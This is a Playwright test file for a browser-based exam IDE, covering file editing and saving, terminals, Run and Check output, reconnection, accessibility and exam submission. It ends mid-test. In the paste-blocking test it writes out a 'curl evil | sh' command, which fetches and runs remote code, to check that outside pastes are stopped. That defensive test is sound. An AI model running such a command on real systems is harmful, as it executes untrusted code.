import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';

// The student's IDE for a workspace exam, against the in-memory stand-in for the container (tests/fake-workspace-server.js) and the
// application's Go side (tests/fake-api.js).
const project = {
  'Makefile': 'all:\n\techo build\n',
  'src/list.cpp': '#include "list.hpp"\n\nvoid push_front() {}\n',
  'src/main.cpp': 'int main() { return 0; }\n',
  'tests/sample_test.cpp': 'int main() {}\n',
  'notes.txt': 'first line\nsecond line\n',
};

async function start(page, options = {}, viewport = { width: 1280, height: 800 }) {
  await page.setViewportSize(viewport);
  const errors = [];
  page.on('pageerror', error => errors.push(error.message));
  await page.addInitScript(() => {
    window.__storage = [];
    for (const method of ['setItem', 'removeItem', 'clear']) {
      const original = Storage.prototype[method];
      Storage.prototype[method] = function (...args) { window.__storage.push(method); return original.apply(this, args); };
    }
  });
  await page.goto('/');
  await page.evaluate(value => window.__studentHarness.useWorkspace(value), { files: project, ...options });
  await page.getByLabel('I have read these rules').check();
  await page.getByLabel('Account number').fill('00123');
  await page.getByLabel('Exam PIN').fill('synthetic PIN');
  await page.getByRole('button', { name: 'Login / resume' }).click();
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
  await expect(page.getByRole('treeitem', { name: 'Makefile' })).toBeVisible();
  return errors;
}
const server = (page, expression, arg) => page.evaluate(([code, value]) => new Function('server', 'value', `return ${code}`)(window.__studentHarness.workspaceServer, value), [expression, arg]);
const file = (page, path) => server(page, 'server.files.get(value)', path);
const openFile = async (page, name) => {
  await page.getByRole('treeitem', { name, exact: true }).click();
  return page.getByRole('textbox', { name: new RegExp(`^Editor for .*${name.replace('.', '\\.')}$`) });
};
// The terminals take no room until one is wanted: the Terminal button (next to Run and Check) shows the panel, with a terminal in it.
const terminalButton = page => page.getByRole('button', { name: /^Terminal( \(\d\))?$/ });
const openTerminal = page => terminalButton(page).click();
async function openSrc(page) {
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  return openFile(page, 'list.cpp');
}

test('the workspace shows the exam text, the files and the status, and none of the question-exam page', async ({ page }) => {
  const errors = await start(page);
  await expect(page.getByRole('region', { name: 'Instructions and TODO list' })).toContainText('make check');
  await expect(page.getByRole('checkbox', { name: /Implement push_front/ })).toBeVisible();
  await expect(page.getByRole('checkbox', { name: /Add a test of your own/ })).toBeVisible();
  // The connection and the saves are told in the toolbar, with the time, and there is no bar of them below the editor.
  await expect(page.locator('header.toolbar').getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
  await expect(page.locator('header.toolbar').getByLabel('Remaining time')).toBeVisible();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toHaveCount(1);
  await expect(page.getByText(/Time left/)).toHaveCount(0);
  await expect(page.getByRole('button', { name: 'Save', exact: true })).toBeVisible();
  await expect(page.getByRole('button', { name: /Submit current answers/ })).toHaveCount(0);
  await expect(page.getByRole('button', { name: 'Finish exam…' })).toBeVisible();
  await expect(page.getByRole('navigation', { name: 'Exercises' })).toHaveCount(0);
  await expect(page.getByLabel('Save status')).toHaveCount(0);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth && document.documentElement.scrollHeight <= innerHeight + 2)).toBe(true);
  expect(errors).toEqual([]);
});

test('a file is opened from the tree, edited, and saved after a second of idle', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await expect(editor).toContainText('push_front');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('// added by the student\n');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).toContainText('●');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Unsaved changes');
  expect(await file(page, 'src/list.cpp')).not.toContain('added by the student');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 3000 }).toContain('// added by the student');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).not.toContainText('●');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText(/Saved \d/);
});

test('Ctrl+S saves at once, and switching tabs saves the file left behind', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// one\n');
  await page.keyboard.press('Control+s');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 400 }).toContain('// one');
  await page.keyboard.type('// two\n');
  await openFile(page, 'notes.txt');
  await expect.poll(() => file(page, 'src/list.cpp'), { timeout: 600 }).toContain('// two');
  // Back again: the tab kept its text and the cursor's place.
  await page.getByRole('tab', { name: /list\.cpp/ }).click();
  await expect(page.getByRole('textbox', { name: /Editor for src\/list\.cpp/ })).toContainText('// two');
});

test('Run and Check show their output in terminals of their own, after saving the files', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// edited before running\n');
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  const run = page.getByRole('region', { name: 'Run output' });
  await expect(run).toContainText('list: 3 2 1');
  expect(await file(page, 'src/list.cpp')).toContain('edited before running');
  await expect(page.getByRole('tab', { name: /Run/ })).toContainText('✓');
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Check output' })).toContainText('FAILED push_front');
  await expect(page.getByRole('tab', { name: /Check/ })).toContainText('✗');
  await expect(page.getByRole('status').filter({ hasText: 'Check ended with code 1' })).toBeVisible();
  // Make it pass, and check again: the new Check takes the place of the old one.
  await editor.click();
  await page.keyboard.type('// DONE\n');
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Check output' })).toContainText('3 of 3 passed');
  await expect(page.getByRole('tab', { name: /Check/ })).toHaveCount(1);
});

test('a terminal takes keystrokes, and what it does to the files shows in the tree within a second', async ({ page }) => {
  await start(page);
  await openTerminal(page);
  const terminal = page.getByRole('region', { name: 'Terminal 1 output' });
  await expect(terminal).toContainText('student@workspace');
  await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
  await page.keyboard.type('touch made_by_terminal.txt');
  await page.keyboard.press('Enter');
  await expect(page.getByRole('treeitem', { name: 'made_by_terminal.txt' })).toBeVisible({ timeout: 1000 });
  await page.keyboard.type('rm notes.txt');
  await page.keyboard.press('Enter');
  await expect(page.getByRole('treeitem', { name: 'notes.txt' })).toHaveCount(0, { timeout: 1000 });
  // Ctrl+C and Ctrl+D go to the program, not to the application.
  await page.keyboard.press('Control+c');
  await page.keyboard.press('Control+d');
  const typed = await server(page, 'server.typed');
  expect(typed.join('')).toContain('\x03');
  expect(typed.join('')).toContain('\x04');
});

test('at most four terminals, each closable', async ({ page }) => {
  await start(page);
  await openTerminal(page);
  const add = page.getByRole('button', { name: 'New terminal' });
  for (let i = 0; i < 3; i += 1) await add.click();
  await expect(page.getByRole('tab', { name: /Terminal \d/ })).toHaveCount(4);
  await expect(add).toBeDisabled();
  await page.getByRole('tab', { name: /Terminal 2/ }).click();
  await page.getByRole('button', { name: 'Close Terminal 2' }).click();
  await expect(page.getByRole('tab', { name: /Terminal \d/ })).toHaveCount(3);
  await expect(add).toBeEnabled();
});

test('files and folders are made, renamed and deleted, with a confirmation for the delete', async ({ page }) => {
  await start(page);
  await page.getByRole('treeitem', { name: 'src', exact: true }).click();
  await page.getByRole('button', { name: 'File', exact: true }).click();
  const dialog = page.getByRole('dialog', { name: 'New file' });
  await expect(dialog).toContainText('src');
  await dialog.getByLabel('Name').fill('a/b');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog.getByRole('alert')).toContainText('one at a time');
  await dialog.getByLabel('Name').fill('main.cpp');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog.getByRole('alert')).toContainText('already exists');
  await dialog.getByLabel('Name').fill('util.cpp');
  await dialog.getByRole('button', { name: 'Create' }).click();
  await expect(dialog).toHaveCount(0);
  await expect(page.getByRole('tab', { name: /util\.cpp/ })).toHaveAttribute('aria-selected', 'true');
  expect(await file(page, 'src/util.cpp')).toBe('');
  // A folder at the top, then a rename of the file.
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click();
  await page.getByRole('button', { name: 'Folder', exact: true }).click();
  await page.getByRole('dialog', { name: 'New folder' }).getByLabel('Name').fill('docs');
  await page.getByRole('dialog', { name: 'New folder' }).getByRole('button', { name: 'Create' }).click();
  await expect(page.getByRole('treeitem', { name: 'docs', exact: true })).toBeVisible();
  await page.getByRole('treeitem', { name: 'util.cpp', exact: true }).click();
  await page.getByRole('button', { name: 'Rename', exact: true }).click();
  const rename = page.getByRole('dialog', { name: 'Rename util.cpp' });
  await rename.getByLabel('New name').fill('helpers.cpp');
  await rename.getByRole('button', { name: 'Rename' }).click();
  await expect(page.getByRole('treeitem', { name: 'helpers.cpp' })).toBeVisible();
  await expect(page.getByRole('tab', { name: /helpers\.cpp/ })).toBeVisible();
  // Delete asks first, and says what goes.
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  const confirm = page.getByRole('dialog', { name: 'Delete helpers.cpp?' });
  await expect(confirm).toContainText('This cannot be undone');
  await confirm.getByRole('button', { name: 'Keep it' }).click();
  expect(await file(page, 'src/helpers.cpp')).toBe('');
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  await page.getByRole('dialog', { name: 'Delete helpers.cpp?' }).getByRole('button', { name: 'Delete', exact: true }).click();
  await expect(page.getByRole('treeitem', { name: 'helpers.cpp' })).toHaveCount(0);
  await expect(page.getByRole('tab', { name: /helpers\.cpp/ })).toHaveCount(0);
  expect(await file(page, 'src/helpers.cpp')).toBeUndefined();
});

test('a file changed in the terminal is reloaded if untouched, and asks if the student has edits', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'rewritten in the terminal\n'));
  await expect(editor).toContainText('rewritten in the terminal');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('my own line');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'rewritten again\n'));
  const prompt = page.getByRole('alert').filter({ hasText: 'This file changed in the terminal' });
  await expect(prompt).toBeVisible();
  await page.waitForTimeout(1300);
  expect(await file(page, 'notes.txt')).toBe('rewritten again\n');
  await prompt.getByRole('button', { name: 'Keep yours' }).click();
  await expect.poll(() => file(page, 'notes.txt')).toContain('my own line');
  await expect(prompt).toHaveCount(0);
  // And the other answer.
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs\n'));
  await expect(editor).toContainText('theirs');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type(' more');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs again\n'));
  await prompt.getByRole('button', { name: 'Reload' }).click();
  await expect(editor).toContainText('theirs again');
  await expect(prompt).toHaveCount(0);
});

test('a TODO tick is kept by the server', async ({ page }) => {
  await start(page);
  const box = page.getByRole('checkbox', { name: /Implement push_front/ });
  await box.check();
  await expect.poll(() => server(page, 'server.todo.t1')).toBe(true);
  await expect(page.getByRole('group', { name: '' }).first()).toBeDefined();
  await expect(page.getByText('1/2')).toBeVisible();
  await box.uncheck();
  await expect.poll(() => server(page, 'server.todo.t1')).toBe(false);
});

test('Save takes a snapshot of what is saved, and says so', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('final answer ');
  await page.getByRole('button', { name: 'Save', exact: true }).click();
  await expect(page.getByText(/^Last Save \d/)).toBeVisible();
  expect(await server(page, "server.submits.at(-1).get('notes.txt')")).toContain('final answer');
  await expect(page.getByText('Your work was saved')).toBeVisible();
  // It is a save, not the end of the exam: the exam's own Submit is not called.
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
  await expect(page.getByRole('button', { name: 'Finish exam…' })).toBeEnabled();
});

test('while the connection is down the editor and terminals are read-only, and what was typed is saved after it returns', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('typed before the drop');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await expect(page.getByText(/Reconnecting…/).first()).toBeVisible();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Reconnecting');
  await expect(page.getByRole('button', { name: 'Run', exact: true })).toBeDisabled();
  await expect(page.getByRole('button', { name: 'Save', exact: true })).toBeDisabled();
  await expect(editor).toHaveAttribute('aria-readonly', 'true');
  await page.keyboard.type('NOT TYPED');
  await expect(editor).not.toContainText('NOT TYPED');
  await page.waitForTimeout(1500);
  expect(await file(page, 'notes.txt')).not.toContain('typed before the drop');
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).toContainText('●');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await expect.poll(() => file(page, 'notes.txt')).toContain('typed before the drop');
  await expect(editor).not.toHaveAttribute('aria-readonly', 'true');
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).not.toContainText('●');
});

test('pulling the network for 30 seconds loses no edits', async ({ page }) => {
  await page.clock.install();
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('before ');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await page.clock.runFor(10000);
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await page.evaluate(() => window.__studentHarness.workspaceConnection('reconnecting'));
  await page.clock.runFor(30000);
  await expect(page.getByRole('tab', { name: /notes\.txt/ })).toContainText('●');
  await page.evaluate(() => window.__studentHarness.workspaceConnection('connected'));
  await page.clock.runFor(2000);
  expect(await file(page, 'notes.txt')).toContain('before ');
});

test('the end of the connection says why when it will not come back by itself', async ({ page }) => {
  await start(page);
  await page.evaluate(() => window.__studentHarness.workspaceConnection('replaced', 'This exam is open in another window, which took the workspace over.'));
  await expect(page.getByText('open in another window').first()).toBeVisible();
  await page.getByRole('button', { name: 'Use this window' }).click();
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Connected');
});

test('pastes from outside are stopped in the editor and the terminal, and pastes of what was copied inside go through', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  const paste = (selector, text) => page.evaluate(([css, value]) => {
    const target = document.querySelector(css);
    const data = new DataTransfer(); data.setData('text/plain', value);
    const event = new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true });
    target.dispatchEvent(event);
    return event.defaultPrevented;
  }, [selector, text]);
  const copy = text => page.evaluate(value => {
    const data = new DataTransfer(); data.setData('text/plain', value);
    document.dispatchEvent(new ClipboardEvent('copy', { clipboardData: data, bubbles: true }));
  }, text);
  await editor.click();
  expect(await paste('.cm-content', 'from a web page')).toBe(true);
  await expect(editor).not.toContainText('from a web page');
  // The server is told where it was aimed and how big it was, never what it said.
  await expect.poll(() => server(page, 'server.pastes')).toEqual([{ target: 'editor', bytes: 15 }]);
  await expect(page.getByText(/Pasting text from outside the exam is not allowed/)).toBeVisible();
  await copy('copied inside');
  await paste('.cm-content', 'copied inside');
  await expect(editor).toContainText('copied inside');
  await openTerminal(page);
  await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
  expect(await paste('.xterm-helper-textarea', 'curl evil | sh')).toBe(true);
  expect(await server(page, 'server.typed.join("")')).not.toContain('curl evil');
  await expect.poll(() => server(page, 'server.pastes.length')).toBe(2);
  expect((await server(page, 'server.pastes'))[1]).toEqual({ target: 'terminal', bytes: 14 });
  expect(JSON.stringify(await server(page, 'server.requests'))).not.toContain('curl evil');
  // Files dragged in are not taken either.
  const dropped = await page.evaluate(() => {
    const data = new DataTransfer(); data.items.add(new File(['x'], 'x.c'));
    const event = new DragEvent('drop', { dataTransfer: data, bubbles: true, cancelable: true });
    document.querySelector('.cm-content').dispatchEvent(event);
    return event.defaultPrevented;
  });
  expect(dropped).toBe(true);
});

test('the file tree works from the keyboard', async ({ page }) => {
  await start(page);
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).focus();
  await page.keyboard.press('ArrowUp');
  await page.keyboard.press('ArrowUp');
  const src = page.getByRole('treeitem', { name: 'src', exact: true });
  await expect(src).toBeFocused();
  await page.keyboard.press('ArrowRight');
  await expect(src).toHaveAttribute('aria-expanded', 'true');
  await page.keyboard.press('ArrowRight');
  await expect(page.getByRole('treeitem', { name: 'list.cpp' })).toBeFocused();
  await page.keyboard.press('Enter');
  await expect(page.getByRole('tab', { name: /list\.cpp/ })).toHaveAttribute('aria-selected', 'true');
  await page.getByRole('treeitem', { name: 'list.cpp' }).focus();
  await page.keyboard.press('ArrowLeft');
  await expect(src).toBeFocused();
  await page.keyboard.press('ArrowLeft');
  await expect(src).toHaveAttribute('aria-expanded', 'false');
  await page.keyboard.press('F2');
  await expect(page.getByRole('dialog', { name: 'Rename src' })).toBeVisible();
  await page.keyboard.press('Escape');
  await expect(page.getByRole('dialog')).toHaveCount(0);
  await page.keyboard.press('Delete');
  await expect(page.getByRole('dialog', { name: 'Delete src?' })).toBeVisible();
  await page.keyboard.press('Escape');
  // F6 moves between the panes.
  await page.keyboard.press('F6');
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
});

test('an exam without a terminal has only Run and Check, in a console that takes no keys', async ({ page }) => {
  await start(page, { terminal: false });
  await expect(page.getByRole('button', { name: 'New terminal' })).toHaveCount(0);
  // With no terminal to open and none shown, there is nothing for a Terminal button to do.
  await expect(terminalButton(page)).toHaveCount(0);
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  const output = page.getByRole('region', { name: 'Run output' });
  await expect(output).toContainText('list: 3 2 1');
  await output.click();
  await page.keyboard.type('whoami');
  expect(await server(page, 'server.typed')).toEqual([]);
  expect(await server(page, 'server.requests.filter(r => r.type === "pty.open").length')).toBe(0);
});

test('a locked exam hides the workspace, and what was typed is still there after the unlock', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('kept through the lock ');
  await page.evaluate(() => { window.__studentHarness.workspaceConnection('locked', 'Your exam is locked.'); window.__studentHarness.lock('away'); });
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeHidden();
  await expect(page.getByText(/locked/i).first()).toBeVisible();
  await page.evaluate(() => { window.__studentHarness.unlock(0); window.__studentHarness.workspaceConnection('connected'); });
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
  await expect(page.getByRole('textbox', { name: /Editor for notes\.txt/ })).toContainText('kept through the lock');
  await expect.poll(() => file(page, 'notes.txt')).toContain('kept through the lock');
});

test('nothing of the workspace is written to the student\'s computer', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('secret work');
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await page.waitForTimeout(1300);
  expect(await page.evaluate(() => window.__storage)).toEqual([]);
  expect(await page.evaluate(() => localStorage.length + sessionStorage.length)).toBe(0);
  expect(await page.evaluate(async () => (await indexedDB.databases?.() ?? []).length)).toBe(0);
  expect(await page.evaluate(() => document.cookie)).toBe('');
});

test('the workspace has no critical accessibility problems', async ({ page }) => {
  await start(page);
  await openSrc(page);
  await openTerminal(page);
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
  const scan = async label => {
    // The exam toolbar is the question exams' own (two buttons whose label does not hold their text); it is left as it is.
    const result = await new AxeBuilder({ page }).exclude('header.toolbar').analyze();
    const serious = result.violations.filter(violation => ['critical', 'serious'].includes(violation.impact));
    expect(serious.map(v => `${v.impact} ${v.id}: ${v.help} :: ${v.nodes.map(n => `${n.target.join(' ')} ${n.failureSummary?.replace(/\n/g, ' ')}`).join(' | ')}`), label).toEqual([]);
  };
  await scan('workspace');
  await page.getByRole('button', { name: 'File', exact: true }).click();
  await scan('the new file dialog');
  await page.keyboard.press('Escape');
  await page.getByRole('treeitem', { name: 'Makefile', exact: true }).click();
  await page.getByRole('button', { name: 'Delete', exact: true }).click();
  await scan('the delete dialog');
  await page.keyboard.press('Escape');
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toBeVisible();
  await scan('the finish dialog');
});

for (const viewport of [{ width: 1280, height: 800 }, { width: 1000, height: 700 }, { width: 1920, height: 1080 }]) {
  test(`the workspace fits a ${viewport.width}x${viewport.height} window, with the editor and the terminal both in view`, async ({ page }) => {
    await start(page, {}, viewport);
    await openFile(page, 'notes.txt');
    await openTerminal(page);
    for (const target of [page.getByRole('textbox', { name: /Editor for/ }), page.getByRole('region', { name: 'Terminal 1 output' }), page.getByRole('group', { name: 'Workspace status' })]) await expect(target).toBeInViewport();
    const box = await page.getByRole('region', { name: 'Terminal 1 output' }).boundingBox();
    expect(box.height).toBeGreaterThan(80);
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
  });
}

// Focus loss is read from the native window's own events, which nothing in the page can cause (docs/tools/TEST-FOCUS.md). What the page
// can promise is that the IDE calls nothing native but the workspace's own methods and the snapshot poll; the manual script does the rest.
test('using the IDE calls no native method but the workspace ones and the poll', async ({ page }) => {
  await start(page);
  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
  const editor = await openSrc(page);
  await editor.click();
  await page.keyboard.type('// typing in the editor\n');
  await openTerminal(page);
  await page.getByRole('textbox', { name: 'Terminal 1 input' }).focus();
  await page.keyboard.type('echo hello');
  await page.keyboard.press('Enter');
  await page.getByRole('tab', { name: /list\.cpp/ }).click();
  await editor.click();
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await page.getByRole('button', { name: 'Check', exact: true }).click();
  await page.getByRole('checkbox', { name: /Implement push_front/ }).check();
  await page.getByRole('button', { name: 'Save', exact: true }).click();
  await page.waitForTimeout(1200);
  const calls = await page.evaluate(() => window.__studentHarness.nativeCalls);
  // (Rules is the login form reading the server's rules for the address it was given; it is not the IDE's.)
  expect([...new Set(calls)].filter(name => name !== 'Rules').sort()).toEqual(['Snapshot', 'WorkspaceInput', 'WorkspaceRequest']);
});

test('the A+ and A− buttons size the editor and the terminals too', async ({ page }) => {
  await start(page);
  await openFile(page, 'notes.txt');
  await openTerminal(page);
  await expect(page.getByRole('region', { name: 'Terminal 1 output' })).toContainText('student@workspace');
  const sizes = () => page.evaluate(() => ({ editor: parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize), terminal: parseFloat(getComputedStyle(document.querySelector('.xterm-rows')).fontSize) }));
  const before = await sizes();
  await page.getByRole('button', { name: 'Larger text' }).click();
  await page.getByRole('button', { name: 'Larger text' }).click();
  await expect.poll(async () => (await sizes()).editor).toBeGreaterThan(before.editor);
  await expect.poll(async () => (await sizes()).terminal).toBeGreaterThan(before.terminal);
  await page.getByRole('button', { name: 'Smaller text' }).click();
  await page.getByRole('button', { name: 'Smaller text' }).click();
  await page.getByRole('button', { name: 'Smaller text' }).click();
  await expect.poll(async () => (await sizes()).terminal).toBeLessThan(before.terminal);
});

test('a workspace that is still starting says so, and one that failed says to call the instructor', async ({ page }) => {
  await start(page);
  await page.evaluate(() => window.__studentHarness.workspaceStatus({ state: 'preparing' }));
  await expect(page.getByText('Your workspace is starting')).toBeVisible();
  await page.evaluate(() => window.__studentHarness.workspaceStatus({ state: 'running' }));
  await expect(page.getByText('Your workspace is starting')).toHaveCount(0);
  await page.evaluate(() => window.__studentHarness.workspaceStatus({ state: 'failed' }));
  await expect(page.getByText('could not be prepared')).toBeVisible();
});

test('finishing the exam asks first, saves and submits a copy, and then ends the session', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.press('Control+End');
  await page.keyboard.type('last words ');
  await page.getByRole('checkbox', { name: /Implement push_front/ }).check();
  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
  // The button asks; nothing is submitted by it.
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  const dialog = page.getByRole('dialog', { name: 'Finish your exam now?' });
  await expect(dialog).toContainText('You have ticked 1 of 2 items');
  await expect(dialog).toContainText('This is final');
  await expect(dialog).toContainText('You have not pressed Save yet');
  await expect(dialog.getByRole('button', { name: 'Keep working' })).toBeFocused();
  expect(await server(page, 'server.submits.length')).toBe(0);
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
  // Escape and the safe button put it away.
  await page.keyboard.press('Escape');
  await expect(dialog).toHaveCount(0);
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Keep working' }).click();
  await expect(dialog).toHaveCount(0);
  expect(await server(page, 'server.submits.length')).toBe(0);
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
  // Confirming saves what was typed, takes the copy, and ends the exam.
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toContainText('not saved yet');
  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Finish my exam' }).click();
  await expect(page.getByText('Submission closed')).toBeVisible();
  expect(await server(page, "server.submits.at(-1).get('notes.txt')")).toContain('last words');
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(true);
  expect(await page.evaluate(() => window.__studentHarness.submitted)).toEqual({});
  await expect(page.getByRole('tree', { name: 'Project files' })).toHaveCount(0);
});

test('a student whose changes cannot be saved does not finish the exam', async ({ page }) => {
  await start(page);
  const editor = await openFile(page, 'notes.txt');
  await editor.click();
  await page.keyboard.type('mine ');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('notes.txt', 'theirs\n'));
  await expect(page.getByRole('alert').filter({ hasText: 'This file changed in the terminal' })).toBeVisible();
  await page.evaluate(() => window.__studentHarness.nativeCallsReset());
  await page.getByRole('button', { name: 'Finish exam…' }).click();
  await page.getByRole('dialog', { name: 'Finish your exam now?' }).getByRole('button', { name: 'Finish my exam' }).click();
  await expect(page.getByText(/exam was not finished/)).toBeVisible();
  await expect(page.getByRole('dialog', { name: 'Finish your exam now?' })).toHaveCount(0);
  expect(await page.evaluate(() => window.__studentHarness.nativeCalls.includes('Submit'))).toBe(false);
  await expect(page.getByRole('tree', { name: 'Project files' })).toBeVisible();
});

// ---- room for the editor ----
test('the terminals take no room until one is wanted, and can be hidden and brought back', async ({ page }) => {
  await start(page, {}, { width: 1280, height: 800 });
  await openSrc(page);
  const panel = page.locator('.terminal-box');
  const editorBox = () => page.locator('.editor-box').boundingBox();
  await expect(panel).toBeHidden();
  await expect(page.getByText('No terminal open')).toHaveCount(0);
  const alone = (await editorBox()).height;
  // With no terminal open the editor has most of the window (the toolbar and the row of buttons are all that is above it).
  expect(alone).toBeGreaterThan(800 * 0.6);

  // Run shows the panel with its output, and the editor gives up part of its room but keeps the larger share.
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await expect(panel).toBeVisible();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
  const shared = (await editorBox()).height;
  const terminalHeight = (await panel.boundingBox()).height;
  expect(shared).toBeLessThan(alone);
  expect(shared).toBeGreaterThan(terminalHeight);
  await expect(terminalButton(page)).toHaveAttribute('aria-pressed', 'true');

  // Hide: the panel goes, the editor has the room and the focus, and the terminal is still there, named with a count.
  await page.getByRole('button', { name: 'Hide the terminals' }).click();
  await expect(panel).toBeHidden();
  expect(Math.abs((await editorBox()).height - alone)).toBeLessThan(2);
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
  await expect(page.getByRole('button', { name: 'Terminal (1)' })).toHaveAttribute('aria-pressed', 'false');
  expect(await server(page, 'server.requests.filter(r => r.type === "pty.close").length')).toBe(0);

  // The button shows it again, and what the program printed is there.
  await terminalButton(page).click();
  await expect(panel).toBeVisible();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');

  // Closing the last terminal takes the panel away (no empty panel), the focus goes back to the editor, and the button opens a new one.
  await page.getByRole('button', { name: 'Close Run' }).click();
  await expect(panel).toBeHidden();
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
  await openTerminal(page);
  await expect(panel).toBeVisible();
  await expect(page.getByRole('textbox', { name: 'Terminal 1 input' })).toBeFocused();
});

test('F6 goes round the panes that are there: a hidden terminal panel is not one of them', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  await editor.click();
  await expect(editor).toBeFocused();
  await page.keyboard.press('F6');
  await expect(page.locator('[data-pane="todo"] :focus')).toHaveCount(1);
  await page.keyboard.press('Shift+F6');
  await expect(page.getByRole('textbox', { name: /Editor for/ })).toBeFocused();
  await openTerminal(page);
  await page.getByRole('textbox', { name: /Editor for/ }).focus();
  await page.keyboard.press('F6');
  await expect(page.locator('[data-pane="terminal"] :focus')).toHaveCount(1);
});

test('the editor has its own A− and A+, which size the code and nothing else', async ({ page }) => {
  await start(page);
  const editor = await openSrc(page);
  const sizes = () => page.evaluate(() => ({ code: parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize), files: parseFloat(getComputedStyle(document.querySelector('[data-pane="tree"]')).fontSize) }));
  const before = await sizes();
  const larger = page.getByRole('button', { name: 'Larger code text' });
  const smaller = page.getByRole('button', { name: 'Smaller code text' });
  await larger.click();
  await larger.click();
  await expect.poll(async () => (await sizes()).code).toBeGreaterThan(before.code * 1.25);
  expect((await sizes()).files).toBe(before.files);
  // A click leaves the student where they were working.
  await expect(editor).toBeFocused();

  // The keys of a code editor: Ctrl and + − 0. They are not typed into the file.
